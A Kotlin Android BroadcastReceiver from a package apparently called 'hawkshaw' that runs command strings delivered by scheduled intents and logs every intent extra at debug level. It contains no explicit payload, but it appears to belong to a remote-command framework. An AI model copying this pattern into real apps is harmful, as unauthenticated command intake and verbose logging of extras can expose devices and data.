package com.hawkshaw.library.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi
import com.hawkshaw.library.handler.CommandSource
import com.hawkshaw.library.handler.handleCommandString
import com.hawkshaw.library.logger.Logger
import android.util.Log // Added for logging

class AlarmReceiver : BroadcastReceiver() {
    companion object {
        const val ACTION_SCHEDULE_COMMAND = "com.hawkshaw.action.SCHEDULE_COMMAND"
        private const val TAG = "AlarmReceiver"
    }

    @RequiresApi(Build.VERSION_CODES.P)
    override fun onReceive(context: Context, intent: Intent) {
        val intentAction = intent.action
        val intentExtras = intent.extras?.let { bundle ->
            bundle.keySet().joinToString { key -> "$key=${bundle.get(key)}" }
        } ?: "null"
        Log.d(TAG, "[DEBUG] onReceive called. Action: \"$intentAction\", Extras: {$intentExtras}")

        when (intentAction) {
            ACTION_SCHEDULE_COMMAND -> {
                Log.d(TAG, "[DEBUG] onReceive: Matched ACTION_SCHEDULE_COMMAND.")
                val commandString = intent.getStringExtra("command")
                val source = intent.getStringExtra("source")
                Log.d(TAG, "[DEBUG] onReceive: Extracted commandString: \"$commandString\", source: \"$source\"")

                if (commandString != null) {
                    Log.d(TAG, "[DEBUG] onReceive: Command string is not null. Calling handleCommandString.")
                    handleCommandString(
                        commandString,
                        CommandSource.valueOf(source ?: CommandSource.Unknown.name)
                    )
                    Log.d(TAG, "[DEBUG] onReceive: handleCommandString completed.")
                } else {
                    Logger.e(TAG, "Received null command string", b = false, i = 12, nothing = null)
                    Log.e(TAG, "[DEBUG] onReceive: Received null command string. Intent Action: \"${intent.action}\", Extras: {$intentExtras}")
                }
            }
            else -> {
                // Existing Logger.w call
                Logger.w(TAG, "Received unknown action: ${intent.action}")
                Log.w(TAG, "[DEBUG] onReceive: Received unknown action. Intent Action: \"${intent.action}\", Extras: {$intentExtras}")
            }
        }
        Log.d(TAG, "[DEBUG] onReceive completed for action: \"$intentAction\"")
    }
}
